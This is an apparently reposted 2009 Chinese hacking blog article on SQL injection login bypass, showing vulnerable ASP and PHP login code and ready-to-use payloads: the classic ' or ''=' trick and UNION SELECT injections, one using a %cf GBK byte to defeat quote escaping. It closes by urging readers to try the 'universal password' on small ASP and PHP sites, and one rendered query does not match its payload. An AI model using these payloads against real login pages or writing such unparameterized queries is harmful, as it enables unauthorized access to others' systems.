---
title: 新型万能登陆密码
description: 新型万能登陆密码本文章无技术含量，只是提供一个思路，思路来源于前不久暴出的那个ewebeditor2.16版本的上传漏洞。对于过滤了单引号或者做了post防注入的站点，此方法也无能为力了；但对于很多对登陆端没做处理的网站，此方法值得一试，尤其是你已经知道源码了却不能执行命令(ACCESS数据库)或者对方能报错(MYSQL数据库)。首先我们回顾下老的万能密码or漏洞的实现机制，先帖一段asp源码：
date: 2009-10-05 11:12:56
category: 技术文章
tags: ['安全', '漏洞信息', '技术类']
post_id: 992
alias: xinxing-wanneng-denglu-mima
ViewNums: 11386
---

[新型万能登陆密码](/blog/xinxing-wanneng-denglu-mima)
原创作者：oldjun
文章来源：[http://www.oldjun.com/](http://www.oldjun.com/blog/index.php/archives/49/)
注：本文已经发表在《黑客手册》2009年05期

本文章无技术含量，只是提供一个思路，思路来源于前不久暴出的那个ewebeditor2.16版本的上传漏洞。对于过滤了单引号或者做了post防注入的 站点，此方法也无能为力了；但对于很多对登陆端没做处理的网站，此方法值得一试，尤其是你已经知道源码了却不能执行命令(ACCESS数据库)或者对方能报错( MYSQL数据库)。

首先我们回顾下老的[万能密码](/blog/xinxing-wanneng-denglu-mima)or漏洞的实现机制，先帖一段asp源码：

---------------------------老的存在or漏洞的asp代码----------------------------------------

username = request.form("username")
password = request.form("password ")
set rs=server.createobject("adodb.recordset")
sql = "select * from admin where UserName='"&username&"' And PassWord='"& password &"'"
rs.open sql,conn,1,3

--------------------------------------------------------------------------------------------------------

将表单中的username和password数据分别赋值给username和password，执行
select * from admin where UserName='"&username&"' And PassWord='"&password&"' 语句
但如果被赋值的username是 ' or ''=' （password任意填写）则SQL语句变成了
select * from admin where UserName='' or ''='' And PassWord='123'
''=''条件成立，则语句成功找到管理表里首位的帐号身份验证登陆，因而成了or漏洞，除' or ''='以外，'or'='or' 啊什么的都可以，于是早年or漏洞形成了万能登陆密码。

针对这种or漏洞，很多asp站点进行了改进，改进后的源码大致如下：

---------------------------后来经过改进后的asp代码-----------------------------------------

username = request.form("username")
password = request.form("password ")
set rs=server.createobject("adodb.recordset")
sql = "select [password] from admin where UserName='"&username&"'"
rs.open sql,conn,1,3
If password = rs("password") then
…’登陆成功
End if

--------------------------------------------------------------------------------------------------------

现在很多asp站点的登陆页面都是这么写的，如果是mssql，还可以执行SQL语句；但如果是ACCESS，很多人应该都会望而却步了吧？其实在没有过滤单引号的情况下，我们还是可以用“万能密码”登陆进后台的。

下面我们进入主题，讨论新型万能登陆密码，以php代码为例，由于字符集编码的问题，管理登陆端可以注入，先看源码：

-----------存在字符集漏洞或者magic_quotes_gpc为off的php代码-------------------

$row=$DB->query_first("SELECT * FROM admin WHERE username='$username'");
If($row){
if($password!=$row[password]) {
…..//成功
}else{
echo "用户名或密码错误!";
}
}else{
echo "用户名或密码错误!";
}

--------------------------------------------------------------------------------------------------------

由于字符集问题，我们可以注入，但由于回显都一样，所以猜不到数据。根据错误提示，我们发现管理表一共6列，password在第三列，于是我们构造如下用户名与密码：
Username=-1%cf' union select 1,1,1 as password,1,1,1 %23
Password=1
带入登陆框，sql语句为：
SELECT * FROM admin WHERE username='-1蟎' union select 1,1 as password,1,1,1,1
前面的用户名肯定不存在，于是select出来的password就是1了，就等于提交的password了，经测试，成功绕过验证。

现在我们再回头看看之前改进过的asp登陆代码，我们该如何绕过呢，原理同上：
Username=-1' union select 1 as [password] from admin where '1'='1
Password=1

呵呵，轻松绕过认证，到此为止大家知道该如何利用了吧，对于现在绝大多数的小asp站以及一定规模的php站点，大家不防试试这个[万能密码](/blog/xinxing-wanneng-denglu-mima)~

